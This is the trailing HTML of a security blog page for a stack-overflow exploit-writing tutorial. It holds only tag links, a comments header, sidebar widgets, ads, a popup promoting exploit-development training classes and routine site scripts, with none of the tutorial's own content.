<a class="yarpp-thumbnail" rel="norewrite" href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" title="Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development" data-wpel-link="internal">
<span class="yarpp-thumbnail-default"><img src="/images/article.png" alt="Default Thumbnail" data-pin-nopin="true"></span><span class="yarpp-thumbnail-title">Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development</span></a>
</div>
</div>
	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                <div class="art-postmetadatafooter"><div class="art-postfootericons art-metadata-icons"><span class="categories">Posted in</span> <a href="https://www.corelan.be/index.php/category/security/" rel="category tag" data-wpel-link="internal">001_Security</a>, <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" rel="category tag" data-wpel-link="internal">Exploit Writing Tutorials</a>, <a href="https://www.corelan.be/index.php/category/security/exploits/" rel="category tag" data-wpel-link="internal">Exploits</a> | <span class="tags">Tagged</span> <a href="https://www.corelan.be/index.php/tag/41414141/" rel="tag" data-wpel-link="internal">41414141</a>, <a href="https://www.corelan.be/index.php/tag/add-esp/" rel="tag" data-wpel-link="internal">add esp</a>, <a href="https://www.corelan.be/index.php/tag/blind-return/" rel="tag" data-wpel-link="internal">blind return</a>, <a href="https://www.corelan.be/index.php/tag/buffer/" rel="tag" data-wpel-link="internal">buffer</a>, <a href="https://www.corelan.be/index.php/tag/buffer-overflow/" rel="tag" data-wpel-link="internal">buffer overflow</a>, <a href="https://www.corelan.be/index.php/tag/bytes/" rel="tag" data-wpel-link="internal">bytes</a>, <a href="https://www.corelan.be/index.php/tag/dll/" rel="tag" data-wpel-link="internal">dll</a>, <a href="https://www.corelan.be/index.php/tag/eip/" rel="tag" data-wpel-link="internal">eip</a>, <a href="https://www.corelan.be/index.php/tag/findjmp/" rel="tag" data-wpel-link="internal">findjmp</a>, <a href="https://www.corelan.be/index.php/tag/jmp/" rel="tag" data-wpel-link="internal">jmp</a>, <a href="https://www.corelan.be/index.php/tag/jmp-esp/" rel="tag" data-wpel-link="internal">jmp esp</a>, <a href="https://www.corelan.be/index.php/tag/jumpcode/" rel="tag" data-wpel-link="internal">jumpcode</a>, <a href="https://www.corelan.be/index.php/tag/metasploit/" rel="tag" data-wpel-link="internal">metasploit</a>, <a href="https://www.corelan.be/index.php/tag/nop/" rel="tag" data-wpel-link="internal">nop</a>, <a href="https://www.corelan.be/index.php/tag/opcode/" rel="tag" data-wpel-link="internal">opcode</a>, <a href="https://www.corelan.be/index.php/tag/pop/" rel="tag" data-wpel-link="internal">pop</a>, <a href="https://www.corelan.be/index.php/tag/pop-pop-ret/" rel="tag" data-wpel-link="internal">pop pop ret</a>, <a href="https://www.corelan.be/index.php/tag/push-ret/" rel="tag" data-wpel-link="internal">push ret</a>, <a href="https://www.corelan.be/index.php/tag/pwned/" rel="tag" data-wpel-link="internal">pwned</a>, <a href="https://www.corelan.be/index.php/tag/reg-offset/" rel="tag" data-wpel-link="internal">reg + offset</a>, <a href="https://www.corelan.be/index.php/tag/ret/" rel="tag" data-wpel-link="internal">ret</a>, <a href="https://www.corelan.be/index.php/tag/shellcode/" rel="tag" data-wpel-link="internal">shellcode</a>, <a href="https://www.corelan.be/index.php/tag/stack/" rel="tag" data-wpel-link="internal">stack</a></div></div>	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <h4 id="comments">15 Responses to <em>Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode</em></h4>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<ul id="comments-list">		<li class="post pingback">
			<p>Pingback: <a href="http://www.rec-sec.com/2010/01/22/corelanc0d3r-exploit-tutorials/" class="url wpel-icon-left" rel="ugc external nofollow noopener noreferrer" data-wpel-link="external" target="_blank"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Recognize-Security | Peter Van Eeckhoutte’s Exploit Writing Tutorials</a></p>
		</li><!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<!-- #comment-## -->
<ul class="children">
<!-- #comment-## -->
</ul><!-- .children -->
<!-- #comment-## -->
</ul>


          <div class="cleared"></div>
        </div>
        <div class="art-layout-cell art-sidebar1">
          <div class="art-block widget widget_search" id="search-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"> <form method="get" name="searchform" action="https://www.corelan.be/">
    <div class="search">
        <input name="s" type="text" value="" style="width: 95%;">
        <span class="art-button-wrapper">
            <span class="art-button-l"> </span>
            <span class="art-button-r"> </span>
            <input class="art-button" type="submit" name="search" value="Search">
        </span>
    </div>
</form>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-5">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Training</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">We have been teaching our win32 exploit dev classes at various security cons and private companies &amp; organizations since 2011 <br><br>Check out our schedules page <b><a href="https://www.corelan-training.com/index.php/training/training-schedules/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>here</a> and sign up for one of our classes now!</b></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-9">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Donate</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">Want to support the Corelan Team community ? <a href="https://www.corelan.be/index.php/donate/" data-wpel-link="internal"><b>Click here to go to our donations page.</b></a><br><br>
<center>Want to donate BTC to Corelan Team? <br><br>
<img src="/wp-content/uploads/2014/01/donate_btc_to_corelan_thumb.png" width="160" ,height="158"></center><br><br>Your donation will help funding server hosting.</div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget Advman_Widget" id="advman-6">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"><script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8134501503628637" crossorigin="anonymous" data-checked-head="true"></script>
<ins class="adsbygoogle" style="display: inline-block; width: 160px; height: 0px;" data-ad-client="ca-pub-8134501503628637" data-ad-slot="4006062044" data-adsbygoogle-status="done"><div id="aswift_1_host" style="border: medium; height: 0px; width: 160px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block; overflow: hidden; opacity: 0;"><iframe id="aswift_1" name="aswift_1" style="left: 0px; position: absolute; top: 0px; border: 0px; width: 160px; height: 0px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="160" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://pagead2.googlesyndication.com/pagead/ads?ltd_cs=1&amp;client=ca-pub-8134501503628637&amp;output=html&amp;h=600&amp;slotname=4006062044&amp;adk=1185345918&amp;adf=273665165&amp;pi=t.ma~as.4006062044&amp;w=160&amp;abgtt=6&amp;lmt=1718453408&amp;format=160x600&amp;url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F23%2Fwriting-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2%2F&amp;host=ca-host-pub-2644536267352236&amp;wgl=1&amp;dt=1718453408131&amp;bpp=2&amp;bdt=1198&amp;idt=430&amp;shv=r20240612&amp;mjsv=m202406110101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;eoidce=1&amp;prev_fmts=0x0&amp;nras=1&amp;correlator=7719720412199&amp;frm=20&amp;pv=1&amp;ga_vid=894080777.1718453408&amp;ga_sid=1718453408&amp;ga_hid=595021088&amp;ga_fc=0&amp;u_tz=120&amp;u_his=50&amp;u_h=864&amp;u_w=1536&amp;u_ah=864&amp;u_aw=1536&amp;u_cd=24&amp;u_sd=1.25&amp;adx=925&amp;ady=673&amp;biw=1280&amp;bih=693&amp;scr_x=0&amp;scr_y=0&amp;eid=44759876%2C44759927%2C44759842%2C42531705%2C42532524%2C44795921%2C95334510%2C95334524%2C95334573%2C95334581%2C95334819%2C95334830%2C95334054%2C95335290&amp;oid=2&amp;pvsid=1478390302474109&amp;tmod=1693119972&amp;uas=0&amp;nvt=1&amp;fc=1920&amp;brdim=-25600%2C-25600%2C-25600%2C-25600%2C1536%2C0%2C159%2C27%2C1280%2C692&amp;vis=2&amp;rsz=%7C%7CoeEr%7C&amp;abl=CS&amp;pfx=0&amp;fu=0&amp;bc=31&amp;bz=0.12&amp;ifi=2&amp;uci=a!2&amp;fsb=1&amp;dtd=435" data-google-container-id="a!2" tabindex="0" title="Advertisement" aria-label="Advertisement" data-google-query-id="CK_0vefJ3YYDFZ7FuwgdV3sBzA" data-load-complete="true"></iframe></div></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Team Merchandise</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">You can support Corelan Team by donating or purchasing items from <b><a href="http://www.cafepress.com/CorelanTeam" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>the official Corelan Team merchandising store.</a></b> <br></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-widget widget widget_text" id="text-2"><div class="art-widget-content">			<div class="textwidget"><br><center><a href="http://www.copyscape.com/plagiarism-tool/"><img src="/wp-content/images/cs-gy-88x31.gif" alt="Protected by Copyscape Web Plagiarism Tool" title="Protected by Copyscape Plagiarism Checker - Do not copy content from this page." width="88" height="31" border="0"></a></center><br></div>
		</div></div><div class="art-block widget widget_text" id="text-6">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan on Slack</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget"><p>You can chat with us and our friends on our Slack workspace:</p>
<li>Go to <a href="https://www.facebook.com/corelanconsulting" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>our facebook page</a></li>
<li>Browse through the posts and find the invite to Slack</li>
<li>Use the invite to access our Slack workspace</li>
</div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_meta" id="meta-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Actions</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">
		<ul>
						<li><a href="https://www.corelan.be/wp-login.php" data-wpel-link="internal">Log in</a></li>
			<li><a href="https://www.corelan.be/index.php/feed/" data-wpel-link="internal">Entries feed</a></li>
			<li><a href="https://www.corelan.be/index.php/comments/feed/" data-wpel-link="internal">Comments feed</a></li>

			<li><a href="https://wordpress.org/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>WordPress.org</a></li>
		</ul>

				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_categories" id="categories-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Categories</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body"><form action="https://www.corelan.be" method="get"><label class="screen-reader-text" for="cat">Categories</label><select name="cat" id="cat" class="postform">
	<option value="-1">Select Category</option>
	<option class="level-0" value="6">001_Security</option>
	<option class="level-1" value="1164">&nbsp;&nbsp;&nbsp;Cons and Seminars</option>
	<option class="level-1" value="4017">&nbsp;&nbsp;&nbsp;Crypto</option>
	<option class="level-1" value="3892">&nbsp;&nbsp;&nbsp;CSO</option>
	<option class="level-1" value="1037">&nbsp;&nbsp;&nbsp;Exploit Writing Tutorials</option>
	<option class="level-1" value="803">&nbsp;&nbsp;&nbsp;Exploits</option>
	<option class="level-1" value="3464">&nbsp;&nbsp;&nbsp;Fuzzing</option>
	<option class="level-1" value="1373">&nbsp;&nbsp;&nbsp;Malware and Reversing</option>
	<option class="level-1" value="3736">&nbsp;&nbsp;&nbsp;Metasploit</option>
	<option class="level-1" value="1549">&nbsp;&nbsp;&nbsp;mona</option>
	<option class="level-1" value="1257">&nbsp;&nbsp;&nbsp;Papers</option>
	<option class="level-1" value="1492">&nbsp;&nbsp;&nbsp;Pentesting</option>
	<option class="level-1" value="3465">&nbsp;&nbsp;&nbsp;Root Cause Analysis</option>
	<option class="level-1" value="3469">&nbsp;&nbsp;&nbsp;Tools</option>
	<option class="level-1" value="1456">&nbsp;&nbsp;&nbsp;Video</option>
	<option class="level-1" value="1236">&nbsp;&nbsp;&nbsp;Web Application Security</option>
	<option class="level-2" value="3697">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL Injection</option>
	<option class="level-0" value="10">Active Directory</option>
	<option class="level-0" value="283">Certificates</option>
	<option class="level-0" value="241">Cisco</option>
	<option class="level-0" value="224">Development</option>
	<option class="level-0" value="124">Juniper</option>
	<option class="level-0" value="3760">Legal</option>
	<option class="level-0" value="8">Linux and Unix</option>
	<option class="level-0" value="12">MS Exchange</option>
	<option class="level-0" value="11">My Free Tools</option>
	<option class="level-0" value="5">Networking</option>
	<option class="level-0" value="13">OpsMgr</option>
	<option class="level-0" value="105">Outlook</option>
	<option class="level-0" value="3990">Penetration testing</option>
	<option class="level-0" value="34">Private</option>
	<option class="level-0" value="465">Scripts</option>
	<option class="level-1" value="466">&nbsp;&nbsp;&nbsp;Powershell</option>
	<option class="level-0" value="4">Sharepoint</option>
	<option class="level-0" value="9">Storage</option>
	<option class="level-0" value="1">Uncategorized</option>
	<option class="level-0" value="15">Virtualization</option>
	<option class="level-0" value="14">Windows Client OS</option>
	<option class="level-0" value="4059">Windows Internals</option>
	<option class="level-0" value="7">Windows Server</option>
	<option class="level-0" value="353">Wordpress</option>
</select>
</form><script type="text/javascript">
/* <![CDATA[ */

(function() {
	var dropdown = document.getElementById( "cat" );
	function onCatChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
			dropdown.parentNode.submit();
		}
	}
	dropdown.onchange = onCatChange;
})();

/* ]]> */
</script>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>          <div class="cleared"></div>
        </div>
    </div>
</div>
<div class="cleared"></div>
    <div class="art-footer">
                <div class="art-footer-t"></div>
                <div class="art-footer-l"></div>
                <div class="art-footer-b"></div>
                <div class="art-footer-r"></div>
                <div class="art-footer-body">
                    
Mastodon: <a rel="me external noopener noreferrer" href="https://infosec.exchange/@corelanc0d3r" data-wpel-link="external" target="_blank" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>@corelanc0d3r</a> | <a rel="me external noopener noreferrer" href="https://infosec.exchange/@corelan" data-wpel-link="external" target="_blank" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>@corelan</a>

                    <a href="https://www.corelan.be/index.php/feed/" class="art-rss-tag-icon" title="Corelan Cybersecurity Research RSS Feed" data-wpel-link="internal"></a>
                  <div class="art-footer-text">
                      <br><br>Copyright Peter Van Eeckhoutte © 2007 - 2024 | All Rights Reserved | <a href="/index.php/terms-of-use/" data-wpel-link="internal">Terms of use</a><br>			<!-- Added by Peter Van Eeckhoutte -->
		      <!--  <font size=-6>Your IP address : 176.107.34.36<br> -->
			<!-- End Add -->
                  </div>
            		<div class="cleared"></div>
                </div>
            </div>
    		<div class="cleared"></div>
        </div>
    </div>
    <div class="cleared"></div>
    <p class="art-page-footer"></p>
</div>
    <div id="wp-footer">
	        

<span id="bruteprotect_uptime_check_string" style="display:none;">7ads6x98y</span>		<!-- Advertising Manager v3.5.3 (0.675 seconds.) -->
<div id="pum-12220" class="pum pum-overlay pum-theme-12209 pum-theme-enterprise-blue popmake-overlay pum-overlay-disabled auto_open click_open pum-active" data-popmake="{&quot;id&quot;:12220,&quot;slug&quot;:&quot;training-info&quot;,&quot;theme_id&quot;:12209,&quot;cookies&quot;:[{&quot;event&quot;:&quot;on_popup_close&quot;,&quot;settings&quot;:{&quot;name&quot;:&quot;pum-12220&quot;,&quot;key&quot;:&quot;&quot;,&quot;session&quot;:null,&quot;path&quot;:true,&quot;time&quot;:&quot;1 day&quot;}}],&quot;triggers&quot;:[{&quot;type&quot;:&quot;auto_open&quot;,&quot;settings&quot;:{&quot;cookie_name&quot;:[&quot;pum-12220&quot;],&quot;delay&quot;:&quot;200&quot;}},{&quot;type&quot;:&quot;click_open&quot;,&quot;settings&quot;:{&quot;extra_selectors&quot;:&quot;&quot;,&quot;cookie_name&quot;:null}}],&quot;mobile_disabled&quot;:true,&quot;tablet_disabled&quot;:null,&quot;meta&quot;:{&quot;display&quot;:{&quot;stackable&quot;:false,&quot;overlay_disabled&quot;:&quot;1&quot;,&quot;scrollable_content&quot;:false,&quot;disable_reposition&quot;:false,&quot;size&quot;:&quot;medium&quot;,&quot;responsive_min_width&quot;:&quot;0%&quot;,&quot;responsive_min_width_unit&quot;:false,&quot;responsive_max_width&quot;:&quot;70%&quot;,&quot;responsive_max_width_unit&quot;:false,&quot;custom_width&quot;:&quot;640px&quot;,&quot;custom_width_unit&quot;:false,&quot;custom_height&quot;:&quot;380px&quot;,&quot;custom_height_unit&quot;:false,&quot;custom_height_auto&quot;:false,&quot;location&quot;:&quot;center&quot;,&quot;position_from_trigger&quot;:false,&quot;position_top&quot;:&quot;100&quot;,&quot;position_left&quot;:&quot;0&quot;,&quot;position_bottom&quot;:&quot;0&quot;,&quot;position_right&quot;:&quot;0&quot;,&quot;position_fixed&quot;:false,&quot;animation_type&quot;:&quot;fade&quot;,&quot;animation_speed&quot;:&quot;350&quot;,&quot;animation_origin&quot;:&quot;center top&quot;,&quot;overlay_zindex&quot;:false,&quot;zindex&quot;:&quot;1999999999&quot;},&quot;close&quot;:{&quot;text&quot;:&quot;X&quot;,&quot;button_delay&quot;:&quot;0&quot;,&quot;overlay_click&quot;:false,&quot;esc_press&quot;:false,&quot;f4_press&quot;:false},&quot;click_open&quot;:[]}}" role="dialog" aria-modal="false" style="opacity: 1; display: block;">

	<div id="popmake-12220" class="pum-container popmake theme-12209 pum-responsive pum-responsive-medium responsive size-medium active custom-position" style="min-width: 0%; max-width: 70%; top: 10px; left: 640px; opacity: 0.0000201419; display: block;">

				

				

		

				<div class="pum-content popmake-content" tabindex="0">
			<h3 style="text-align: center;">Hi there!</h3>
<p>&nbsp;</p>
<p style="text-align: center;">Do you like our free content? Enjoying the materials we put together?</p>
<p style="text-align: center;">Are you interested in learning how to write exploits for Windows, but perhaps looking for updated materials?</p>
<p style="text-align: center;">Are you struggling to fully grasp the concepts based on what you find online? Would you perhaps prefer to learn in a classroom setting instead?</p>
<p>&nbsp;</p>
<h3 style="text-align: center;"><span style="color: #ffffff;"><em><strong>We have good news for you!</strong></em></span></h3>
<p>&nbsp;</p>
<p style="text-align: center;">Did you know that we travel to strategic places around the world, to teach our world-renowned exploit development classes.</p>
<p style="text-align: center;">In order to preserve and ensure a top-quality learning experience, all of our classes are delivered in-person.</p>
<p style="text-align: center;">I also teach private classes! For larger groups, I’ll glady come to you. For smaller groups, willing to travel to Belgium,&nbsp; I’ll provide a training room near Bruges.</p>
<p>&nbsp;</p>
<p style="text-align: center;">We currently offer 2 classes:</p>
<p style="text-align: center;">Our “<a href="https://www.corelan-training.com/index.php/training/bootcamp" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Bootcamp</a>” classes covers the basics of exploit development for Windows 11.</p>
<p style="text-align: center;">The “<a href="https://www.corelan-training.com/index.php/training/advanced" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Advanced</a>” class covers heap exploitation for Windows 7, Windows 10 and Windows 11.</p>
<p style="text-align: center;">Both classes contain a short introduction on x64 exploitation!</p>
<p>&nbsp;</p>
<p style="text-align: center;">You can find our schedules here: <a href="https://www.corelan-training.com/index.php/training-schedules" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>https://www.corelan-training.com/index.php/training-schedules</a> .</p>
<p>&nbsp;</p>
<blockquote>
<p style="text-align: center;"><span style="color: #ffffff;"><em><strong>&gt;&gt;&gt; Our classes tend to sell out fast, so sign up today and secure your seat in one of our classes !! &lt;&lt;&lt;</strong></em></span></p>
</blockquote>
<p>&nbsp;</p>
<p style="text-align: center;">And if you’re not sure – <a href="https://www.corelan-training.com/index.php/testimonials/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>feel free to check what our students have to say about our classes</a>.</p>
<p>&nbsp;</p>
<p style="text-align: center;">Enjoy!</p>
<p style="text-align: center;">
		</p></div>


				

							<button type="button" class="pum-close popmake-close" aria-label="Close">
			X			</button>
		
	</div>

</div>

  <!--copyscapeskip-->
  <aside id="moove_gdpr_cookie_info_bar" class="moove-gdpr-info-bar-hidden moove-gdpr-align-center moove-gdpr-dark-scheme gdpr_infobar_postion_bottom" aria-label="GDPR Cookie Banner" style="display: none;">
    <div class="moove-gdpr-info-bar-container">
      <div class="moove-gdpr-info-bar-content">
        
<div class="moove-gdpr-cookie-notice">
  <p>We are using cookies to give you the best experience on our website.</p>
<p>You can find out more about which cookies we are using or switch them off in <button data-href="#moove_gdpr_cookie_modal" class="change-settings-button">settings</button>.</p>
</div>
<!--  .moove-gdpr-cookie-notice -->        
<div class="moove-gdpr-button-holder">
		  <button class="mgbutton moove-gdpr-infobar-allow-all gdpr-fbo-0" aria-label="Accept">Accept</button>
	  </div>
<!--  .button-container -->      </div>
      <!-- moove-gdpr-info-bar-content -->
    </div>
    <!-- moove-gdpr-info-bar-container -->
  </aside>
  <!-- #moove_gdpr_cookie_info_bar -->
  <!--/copyscapeskip-->
<link rel="stylesheet" id="yarppRelatedCss-css" href="https://www.corelan.be/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=5.30.10" type="text/css" media="all">
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/comment-reply.min.js?ver=81f1e4891736f11093e8f14f84539862" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" id="wp-postviews-cache-js-extra">
/* <![CDATA[ */
var viewsCacheL10n = {"admin_ajax_url":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","nonce":"0b801e2690","post_id":"2146"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/wp-postviews/postviews-cache.js?ver=1.68" id="wp-postviews-cache-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/auto-thickbox/js/auto-thickbox.min.js?ver=20150514" id="thickbox-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/page-links-to/dist/new-tab.js?ver=3.3.7" id="page-links-to-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2" id="jquery-ui-core-js"></script>
<script type="text/javascript" id="popup-maker-site-js-extra">
/* <![CDATA[ */
var pum_vars = {"version":"1.19.0","pm_dir_url":"https:\/\/www.corelan.be\/wp-content\/plugins\/popup-maker\/","ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","restapi":"https:\/\/www.corelan.be\/index.php\/wp-json\/pum\/v1","rest_nonce":null,"default_theme":"12207","debug_mode":"","disable_tracking":"","home_url":"\/","message_position":"top","core_sub_forms_enabled":"1","popups":[],"cookie_domain":"","analytics_route":"bb41a7b3b156d95653c79ae77e7cc8b5","analytics_api":"https:\/\/www.corelan.be\/index.php\/wp-json\/860c56f7cac49da01f9d073abd7e484e\/v1"};
var pum_sub_vars = {"ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","message_position":"top"};
var pum_popups = {"pum-12220":{"triggers":[{"type":"auto_open","settings":{"cookie_name":["pum-12220"],"delay":"200"}}],"cookies":[{"event":"on_popup_close","settings":{"name":"pum-12220","key":"","session":null,"path":true,"time":"1 day"}}],"disable_on_mobile":true,"disable_on_tablet":false,"atc_promotion":null,"explain":null,"type_section":null,"theme_id":"12209","size":"medium","responsive_min_width":"0%","responsive_max_width":"70%","custom_width":"640px","custom_height_auto":false,"custom_height":"380px","scrollable_content":false,"animation_type":"fade","animation_speed":"350","animation_origin":"center top","open_sound":"none","custom_sound":"","location":"center","position_top":"100","position_bottom":"0","position_left":"0","position_right":"0","position_from_trigger":false,"position_fixed":false,"overlay_disabled":true,"stackable":false,"disable_reposition":false,"zindex":"1999999999","close_button_delay":"0","fi_promotion":null,"close_on_form_submission":false,"close_on_form_submission_delay":"0","close_on_overlay_click":false,"close_on_esc_press":false,"close_on_f4_press":false,"disable_form_reopen":true,"disable_accessibility":false,"theme_slug":"enterprise-blue","id":12220,"slug":"training-info"}};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="//www.corelan.be/wp-content/uploads/eb7dd09ba487003efa16cb4e2c57aef5.js?defer&amp;generated=1716470310&amp;ver=1.19.0" id="popup-maker-site-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/popup-maker/assets/js/vendor/mobile-detect.min.js?ver=1.3.3" id="mobile-detect-js"></script>
<script defer="" type="text/javascript" src="https://stats.wp.com/e-202424.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script defer="" type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"15427359\",\"post\":\"2146\",\"tz\":\"2\",\"srv\":\"www.corelan.be\",\"j\":\"1:13.5\"}") ]);
_stq.push([ "clickTrackerInit", "15427359", "2146" ]);
/* ]]> */
</script>
